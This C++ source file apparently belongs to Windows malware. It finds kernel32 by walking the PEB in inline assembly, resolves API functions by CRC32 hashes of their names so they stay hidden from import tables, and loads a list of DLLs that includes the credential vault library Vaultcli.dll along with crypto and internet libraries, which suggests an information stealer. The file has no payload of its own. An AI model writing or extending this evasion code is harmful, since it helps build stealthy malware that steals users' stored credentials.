#include "Common.h"

#define RVATOVA( base, offset ) ( (SIZE_T)base + (SIZE_T)offset )

static T_LoadLibraryA ptrLoadLibraryA = nullptr;
static T_GetProcAddress ptrGetProcAddress = nullptr;

LPVOID GetApiAddr(HMODULE hDll, UINT nameHash)
{
	if (hDll == nullptr || nameHash == 0) return nullptr;

	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((LPVOID)((SIZE_T)hDll + ((PIMAGE_DOS_HEADER)(hDll))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)));
	PIMAGE_EXPORT_DIRECTORY exportDir = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(hDll, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	int ordinal = -1;

	DWORD* namesTable = (DWORD*)RVATOVA(hDll, exportDir->AddressOfNames);
	WORD* ordinalTable = (WORD*)RVATOVA(hDll, exportDir->AddressOfNameOrdinals);

	for (UINT i = 0; i < exportDir->NumberOfNames; i++)
	{
		char* name = (char*)RVATOVA(hDll, *namesTable);
		if (crc32_run(name) == nameHash)
		{
			ordinal = *ordinalTable;
			break;
		}
		namesTable++;
		ordinalTable++;
	}

	if (ordinal < 0) return nullptr;

	size_t exportSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD* addrTable = (DWORD*)RVATOVA(hDll, exportDir->AddressOfFunctions);
	ULONG_PTR rva = addrTable[ordinal];
	ULONG_PTR addr = (ULONG_PTR)RVATOVA(hDll, rva);
	if (addr > (ULONG_PTR)exportDir && addr < (ULONG_PTR)exportDir + exportSize)
	{
		char* s = (char*)addr;
		char nameDll[32];
		int i = 0;
		while (s[i] != '.')
		{
			nameDll[i] = s[i];
			i++;
		}
		s += i + 1;
		nameDll[i++] = '.';
		nameDll[i++] = 'd';
		nameDll[i++] = 'l';
		nameDll[i++] = 'l';
		nameDll[i] = 0;
		int num = 0;
		if (*s == '#')
		{
			while (*++s) num = num * 10 + *s - '0';
			s = (char*)&num;
		}
		HMODULE hdll = ptrLoadLibraryA(nameDll);
		return ptrGetProcAddress(hdll, s);
	}
	else
		return (void*)addr;
}

HMODULE GetKernel32()
{
	__asm
	{
		mov eax, fs: [0x30]
		mov eax, [eax + 0xC]
		mov eax, [eax + 0xC]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x18]
	}
}

void InitApi()
{
	HMODULE hKernel32 = GetKernel32();
	ptrLoadLibraryA = (T_LoadLibraryA)GetApiAddr(hKernel32, CRC32_STR("LoadLibraryA"));
	ptrGetProcAddress = (T_GetProcAddress)GetApiAddr(hKernel32, CRC32_STR("GetProcAddress"));
}

static const char* DllNames[] =
{
	"Kernel32.dll",
	"Shell32.dll",
	"Crypt32.dll",
	"Wininet.dll",
	"Advapi32.dll",
	"gdiplus.dll",
	"Gdi32.dll",
	"User32.dll",
	"Ole32.dll",
	"Bcrypt.dll",
	"Urlmon.dll",
	"Vaultcli.dll"
};

static HMODULE DllHandls[sizeof(DllNames) / sizeof(char*)];
static UINT NameHashs[API_LIMIT];
static LPVOID FuncsPtrs[API_LIMIT];
static size_t LastIndex = 0;

LPVOID GetWinAPI(size_t nDll, UINT nameHash)
{
	if (!ptrLoadLibraryA || !ptrGetProcAddress) InitApi();

	LPVOID funcAddr = nullptr;
	size_t index = 0;
	for (size_t i = 0; i < LastIndex; i++)
	{
		if (NameHashs[i] == nameHash)
		{
			index = i;
			break;
		}
	}

	if (index)
	{
		funcAddr = FuncsPtrs[index];
	}
	if (!funcAddr)
	{
		HMODULE hDll = DllHandls[nDll];
		if (!hDll)
		{
			hDll = ptrLoadLibraryA(DllNames[nDll]);
			DllHandls[nDll] = hDll;
		}

		if (hDll)
		{
			funcAddr = GetApiAddr(hDll, nameHash);
			if (funcAddr)
			{
				NameHashs[LastIndex] = nameHash;
				FuncsPtrs[LastIndex] = funcAddr;
				LastIndex++;
			}
		}
	}

	return funcAddr;
}



